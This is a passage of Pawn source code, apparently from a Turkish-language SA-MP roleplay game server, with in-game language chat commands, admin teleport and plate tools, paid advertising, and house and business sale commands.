		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,8);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,8);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,8);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:ibr(playerid, params[])
{
	if(Karakter[playerid][dil] != 9 && Karakter[playerid][ibra] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 9);
	if(isnull(params)) return Kullanim(playerid, "/ibr(anice) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,9);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,9);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,9);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:yun(playerid, params[])
{
	if(Karakter[playerid][dil] != 10 && Karakter[playerid][yunan] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 10);
	if(isnull(params)) return Kullanim(playerid, "/yunan(anca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,10);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,10);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,10);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:erm(playerid, params[])
{
	if(Karakter[playerid][dil] != 11 && Karakter[playerid][ermen] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 11);
	if(isnull(params)) return Kullanim(playerid, "/erm(enice) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,11);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,11);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,11);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:irl(playerid, params[])
{
	if(Karakter[playerid][dil] != 13 && Karakter[playerid][irlan] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 13);
	if(isnull(params)) return Kullanim(playerid, "/irl(andaca) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,13);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,13);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,13);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:por(playerid, params[])
{
	if(Karakter[playerid][dil] != 14 && Karakter[playerid][porte] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 14);
	if(isnull(params)) return Kullanim(playerid, "/por(tekizce) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,14);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,14);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,14);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:sir(playerid, params[])
{
	if(Karakter[playerid][dil] != 15 && Karakter[playerid][sirp] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 15);
	if(isnull(params)) return Kullanim(playerid, "/sýr(pça) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,15);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,15);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,15);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:arn(playerid, params[])
{
	if(Karakter[playerid][dil] != 16 && Karakter[playerid][arnavut] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 16);
	if(isnull(params)) return Kullanim(playerid, "/arn(avutça) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,16);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,16);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,16);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}

CMD:slo(playerid, params[])
{
	if(Karakter[playerid][dil] != 12 && Karakter[playerid][slovak] != 10) return Hata(playerid, "Bu dili bilmiyorsunuz.");
	SetPVarInt(playerid, "SectigiDil", 12);
	if(isnull(params)) return Kullanim(playerid, "/slo(vakça) [yazý]");
	new string[256];
	dilkullaniyor[playerid] = true;
	if(strlen(params) > 80)
	{
		new toxt[3][128];
		TextBol(params,toxt,60);
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		}
		else format(string, sizeof(string), "%s %s ...",OyuncuAdiniBul(playerid), toxt[0]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,12);
		format(string, sizeof(string), "%s ... %s",OyuncuAdiniBul(playerid), toxt[1]);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,12);
		KonusturMeyhaneci(playerid, strlen(params));
  	}
	else
	{
		if(Arama[playerid][2] != 0)
		{
		    TelefonYaziGonder(playerid, Arama[playerid][2], params);
			format(string, sizeof(string), "%s(telefon) %s",OyuncuAdiniBul(playerid), params);
		}
		else format(string, sizeof(string), "%s %s",OyuncuAdiniBul(playerid), params);
		ProxDetectorEx(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5,12);
		new to_others[MAX_CHATBUBBLE_LENGTH+1];
		format(to_others,MAX_CHATBUBBLE_LENGTH,"\"%s\"",params);
		KonusturMeyhaneci(playerid, strlen(params));
	}
	dilkullaniyor[playerid] = false;
	return 1;
}


CMD:asqlid(playerid, params[])
{
	new vid=GetNearestVehicle(playerid);
	if(!IsValidVehicle(vid)) return Hata(playerid, "Yakýnýnýzda bir araç bulunmamaktadýr.");
	new mstring[128];
	format(mstring, sizeof(mstring), "%s - ID:%d - SQLID:%d", GetVehicleName(vid), vid, Arac[vid][aid]);
	SendClientMessage(playerid, -1, mstring);
	return 1;
}

CMD:gotocar(playerid, params[])
{
    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
    {
        new deq,nstring[10];
		if(IsNumeric(params))
		{
			new Float:XX,Float:YY,Float:ZZ;
        	GetVehiclePos(strval(params),XX,YY,ZZ);
        	SetPlayerPos(playerid,XX,YY,ZZ+2);
        	if(cezali[strval(params)] > 0) Bilgi(playerid, "Aracýn ceza kaydý bulunmaktadýr.");
        	return 1;
		}
		if(sscanf(params,"s[10]d",nstring,deq)) return Kullanim(playerid, "/gotocar [sqlid/id] [sqlid]");
		if(Buysa("sqlid",nstring))
		{
		    for(new i;i<MAX_VEHICLES;i++)
		    {
		        if(Arac[i][aid] == deq)
		        {
		            new Float:XX,Float:YY,Float:ZZ;
        			GetVehiclePos(i,XX,YY,ZZ);
        			SetPlayerPos(playerid,XX,YY,ZZ+2);
					break;
		        }
		    }
		}
        if(cezali[deq] > 0) Bilgi(playerid, "Aracýn ceza kaydý bulunmaktadýr.");
	}
	else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
	return 1;
}


CMD:raporiptal(playerid)
{
    if(Karakter[playerid][Rapor] == 1)
    {
        Karakter[playerid][Rapor] = 0;
        format(Karakter[playerid][RaporTarih], 64, "");
		strdel(Karakter[playerid][RaporMesaj], 0, 256);
        Bilgi(playerid, "Mevcut raporunuz baþarýyla iptal edildi.");
    }
    else return Hata(playerid, "Sistemimizde mevcut bir raporunuz bulunmamaktadýr.");
    return 1;
}
CMD:soruiptal(playerid)
{
    if(Karakter[playerid][Soru] == 1)
    {
        Karakter[playerid][Soru] = 0;
		strdel(Karakter[playerid][SoruMesaj], 0, 256);
        Bilgi(playerid, "Mevcut sorunuz baþarýyla iptal edildi.");
    }
    else return Hata(playerid, "Sistemimizde mevcut bir raporunuz bulunmamaktadýr.");
    return 1;
}
CMD:reklam(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
	static msstring[10];
	sscanf(params,"s[10]",msstring);
	if(Buysa(msstring,"iptal") && !isnull(params))
	{
	    reklamgonderdi[playerid] = 0;
	    reklamfiyat[playerid] = 0;
	    reklamsira[playerid] = 0;
	    reklambirlik[playerid] = 0;
	    strdel(reklamesaj[playerid], 0, 196);
	    Bilgi(playerid, "Reklamýnýzý iptal ettiniz.");
	}
	else if(reklamgonderdi[playerid] == 1)
	{
		static mstring[128];
		format(mstring, 128, "Þuanda bir reklamýnýz bulunmaktadýr, reklam sýranýz: %d",reklamsira[reklambirlik[playerid]]);
		Bilgi(playerid, mstring);
		Ipucu(playerid, "Reklamýnýzý iptal etmek istiyorsanýz: ''/reklam iptal''");
	}
    else
	{
	    for(new i;i<MAX_BIRLIK;i++)
	    {
			if(IsPlayerInRangeOfPoint(playerid, 3.0, Birlik[i][breklamx], Birlik[i][breklamy], Birlik[i][breklamz]) && GetPlayerVirtualWorld(playerid) == Birlik[i][breklamvw] && GetPlayerInterior(playerid) == Birlik[i][breklamint] && Birlik[i][ftip] == SANTV)
		    {
		        if(Birlik[i][hesapno] == 0) return Hata(playerid, "Bu kanal hesap numarasýný ayarlamamýþ.");
		        new resultts[256];
				if(sscanf(params,"s[256]",resultts))
				{
					Kullanim(playerid, "/reklam [reklam metni]");
					Ipucu(playerid, "Karakter sayýsýna göre ücretlendirilirsiniz. Reklamýnýz tüm oyunculara iletilir. Oyun dýþý bir reklam paylaþmanýn cezasý kalýcý yasaklamadýr.");
					return 1;
				}
				if(Karakter[playerid][para] >= strlen(resultts)*Birlik[i][rfiyat])
				{
					format(reklamesaj[playerid], 196, "%s", resultts);
					reklamgonderdi[playerid] = 1;
					reklamfiyat[playerid] = strlen(resultts)*Birlik[i][rfiyat];
					reklamlar[i]++;
					reklamsira[playerid] = reklamlar[i];
					reklambirlik[playerid] = i;
					new mstring[128];
					format(mstring, sizeof(mstring), "%s yetkililerinin reklamýnýzý onaylamasýný bekleyin.", Birlik[i][fisim]);
					Bilgi(playerid, mstring);
					foreach(new ix : Player)
					{
					    if(Girdi[ix])
						{
						    if(aDuty[ix] || Karakter[ix][birlik] == i)
						    {
						        SendClientMessage(ix, COLOR_NEWS, "[REKLAM] Yeni bir reklam var!");
						    }
						}
					}
				}
				else Hata(playerid, "Yanýnýzda yeterli miktarda nakit bulunmamaktadýr.");
				return 1;
		    }
		}
	}
	Hata(playerid, "Burada reklam veremezsiniz.");
    return 1;
}

/*stock SprunkYaninda(playerid)
{
	for(new i=0;i<sizeof(VMachines);i++)
	{
	    if(IsPlayerInRangeOfPoint(playerid, 2.5, VMachines[i][0], VMachines[i][1], VMachines[i][2]))
	    {
	        return 1;
	    }
	}
	return 0;
}*/

CMD:galeri(playerid)
{
    new mesafe = IsyeriMesafesi(5.0, playerid);
    if(mesafe == 0) return Hata(playerid, "Ýþyerinizin yakýnýnda olmalýsýnýz.");
    if(Isyeri[mesafe][itip] != 20 && Isyeri[mesafe][itip] != 21) return 1;
    if(!IsyeriYetkilisi(playerid, mesafe)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
    ShowPlayerDialog(playerid, 359, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Galeri", "Normal Galeri\nSuper Sport Galeri", "Seç", "Ýptal");
    return 1;
}

CMD:unluyap(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	new pid;
	if(sscanf(params,"u",pid)) return Kullanim(playerid, "/unluyap [oyuncuID]");
	if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
	new mstring[128];
	switch(Karakter[pid][unlu])
	{
	    case 0:
	    {
			format(mstring, sizeof(mstring), "%s adlý oyuncuyu ünlü yaptýnýz.",OyuncuAdiniBul(pid));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizi ünlü yaptý.",Karakter[playerid][anick]);
			Bilgi(pid, mstring);
			Karakter[pid][unlu] = 1;
		}
		case 1:
		{
		    format(mstring, sizeof(mstring), "%s adlý oyuncunun ününü aldýnýz.",OyuncuAdiniBul(pid));
			Bilgi(playerid, mstring);
			Karakter[pid][unlu] = 0;
		}
	}
	return 1;
}

CMD:evsat(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
    new id = EvMesafesi(2.0, playerid);
    if(id == 0) return Hata(playerid, "Evin yakýnýnda deðilsiniz.");
    if(Ev[id][birlikdestek]) return Hata(playerid, "Bu evi satamazsýnýz.");
    new string[128];
	if(isnull(params))
	{
		Kullanim(playerid, "/evsat [fonksiyon]");
		format(string, sizeof(string), "Geçerli fonksiyonlar: sistem[$%d], oyuncu", floatround(Ev[id][efiyat]*40/100));
		SendClientMessage(playerid, -1, string);
		return 1;
	}
	new nstring[16],pid=-1,_efiyat=0;
	sscanf(params,"s[16]dd",nstring,pid,_efiyat);
	if(Buysa("oyuncu",nstring))
	{
		if(Ev[id][esahip] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu evin sahibi siz deðilsiniz.");
		if(pid == -1 || _efiyat < 1) return Kullanim(playerid, "/evsat oyuncu [oyuncuID] [fiyat]");
		if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
		if(!IsPlayerNearPlayer(playerid, pid, 5)) return Hata(playerid, "Oyuncuya yakýn deðilsiniz.");
		SetPVarInt(pid, "EvSatici", playerid);
		SetPVarInt(pid, "EvSatisFiyat", _efiyat);
		SetPVarInt(pid, "EvSatisID", id);
		new mstring[128];
		format(mstring, sizeof(mstring), "%s adlý oyuncuya ev satma isteði yolladýnýz.",OyuncuAdiniBul(pid));
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s adlý oyuncu size %s %d adresli evi %d fiyata satmak istiyor:",OyuncuAdiniBul(playerid),GetLocation(Ev[id][girisX],Ev[id][girisY],Ev[id][girisZ]),id,_efiyat);
		ShowPlayerDialog(pid, 306, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ev Satýþ", mstring, "Satýnal", "Ýptal");
		return 1;
	}
	else if(Buysa("sistem",nstring))
	{
		if(id != 0)
		{
		    if(Ev[id][esahip] == Karakter[playerid][sqlid])
		    {
		        new is = id;
		        if(PlayerToPoint(1.0, playerid, Ev[is][girisX], Ev[is][girisY], Ev[is][girisZ]))
		        {
					Ev[is][ekilit] = 1;
					Ev[is][esahip] = -1;
					Ev[is][kira] = 0;
					Ev[is][kirafiyat] = 0;
					Ev[is][kiralayan] = -1;
					GivePlayerCash(playerid,floatround(Ev[is][efiyat]*40/100));
					format(string, sizeof(string), "Evinizi "DOLAR"$"C1"%d karþýlýðýnda sisteme sattýnýz.", floatround(Ev[is][efiyat]*40/100));
					Bilgi(playerid, string);
					KarakterKaydet(playerid);
					EvKaydet(is);
					format(string, sizeof(string), "[EVSAT] %d idli evini $%d karsiliginda sisteme satti.", is, floatround(Ev[is][efiyat]*40/100));
					Log(playerid, string);
					DestroyColouredCheckpoint(Ev[is][ecp]);
					EvAyarla(is);
					EvAnahtarTumSil(is);
				}
			}
			else Hata(playerid, "Bu evin sahibi siz deðilsiniz.");
		}
	}
	return 1;
}
CMD:isyerisat(playerid, params[])
{
	if(!Girdi[playerid]) return 1;
    new id = IsyeriMesafesi(2.0, playerid);
    if(id == 0) return Hata(playerid, "Ýþyerinin yakýnýnda deðilsiniz.");
    if(Isyeri[id][birlikdestek]) return Hata(playerid, "Bu iþyerini satamazsýnýz.");
    if(Isyeri[id][ivergi] >= Isyeri[id][ifiyat]*35/100) return Hata(playerid, "Bu iþyeri vergi kilidinde.");
    new string[128];
	if(isnull(params))
	{
		Kullanim(playerid, "/isyerisat [fonksiyon]");
		format(string, sizeof(string), "Geçerli fonksiyonlar: sistem[$%d], oyuncu", floatround(Isyeri[id][ifiyat]*40/100));
		SendClientMessage(playerid, -1, string);
		return 1;
	}
	new nstring[16],pid=-1,_ifiyat=0;
	sscanf(params,"s[16]dd",nstring,pid,_ifiyat);
	if(Buysa("oyuncu",nstring))
	{
	    if(Isyeri[id][isahip] != Karakter[playerid][sqlid]) return Hata(playerid, "Bu iþyerinin sahibi siz deðilsiniz.");
		if(pid == -1 || _ifiyat < 1) return Kullanim(playerid, "/isyerisat oyuncu [oyuncuID] [fiyat]");
		if(!Girdi[pid]) return Hata(playerid, "Oyuncu oyuna baðlý deðil.");
		if(!IsPlayerNearPlayer(playerid, pid, 5)) return Hata(playerid, "Oyuncuya yakýn deðilsiniz.");
		SetPVarInt(pid, "IsSatici", playerid);
		SetPVarInt(pid, "IsSatisFiyat", _ifiyat);
		SetPVarInt(pid, "IsSatisID", id);
		new mstring[128];
		format(mstring, sizeof(mstring), "%s adlý oyuncuya iþyeri satma isteði yolladýnýz.",OyuncuAdiniBul(pid));
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s adlý oyuncu size %s %d adresli iþyerini %d fiyata satmak istiyor:",OyuncuAdiniBul(playerid),GetLocation(Isyeri[id][girisX], Isyeri[id][girisY], Isyeri[id][girisZ]),id,_ifiyat);
		ShowPlayerDialog(pid, 307, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Ýþyeri Satýþ", mstring, "Satýnal", "Ýptal");
		return 1;
	}
	else if(Buysa("sistem",nstring))
	{
		if(id != 0)
		{
		    if(Isyeri[id][isahip] == Karakter[playerid][sqlid])
		    {
		        if(PlayerToPoint(1.0, playerid, Isyeri[id][girisX], Isyeri[id][girisY], Isyeri[id][girisZ]))
		        {
		            if(Isyeri[id][ivergi] > 0) return Hata(playerid, "Ýþyerini sisteme satabilmek için vergisini ödemek zorundasýnýz.");
					Isyeri[id][ikilit] = 1;
					Isyeri[id][isahip] = -1;
					Isyeri[id][kira] = 0;
					Isyeri[id][kiralayan] = -1;
					Isyeri[id][kirafiyat] = 0;
					Isyeri[id][ortak] = -1;
					Isyeri[id][girisucreti] = 0;
					Isyeri[id][itip] = 8;
					GivePlayerCash(playerid,floatround(Isyeri[id][ifiyat]*40/100));
					format(string, sizeof(string), "Ýþyerinizi $%d karþýlýðýnda sisteme sattýnýz.", floatround(Isyeri[id][ifiyat]*40/100));
					Bilgi(playerid, string);
					format(string, sizeof(string), "[ISYERISAT] %d idli isyerini $%d karsiliginda sisteme satti.", id, floatround(Isyeri[id][ifiyat]*40/100));
					Log(playerid, string);
					KarakterKaydet(playerid);
					IsyeriKaydet(id);
					IsyeriAyarla(id);
				} else Hata(playerid, "Ýþyerinin önünde deðilsiniz.");
			}
			else Hata(playerid, "Bu iþyerinin sahibi siz deðilsiniz.");
		}
	}
	return 1;
}

CMD:aplaka(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	new tmpcar = GetClosestVehicle(playerid);
 	if(tmpcar == 0)
	{
	    Hata(playerid, "Yakýnýnýzda bir araç bulunmamaktadýr.");
		return 1;
	}
	ShowPlayerDialog(playerid, 7, DIALOG_STYLE_INPUT, "Araç plakasýný düzenleyin!", "Eski araç plakasý loglara kaydedildi.\nYeni araç plakasýný girin:", "Onayla", "Kapat");
	return 1;
}

CMD:aplakatext(playerid, params[])
{
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Herhangi bir aracýn içerisinde deðilsiniz.");
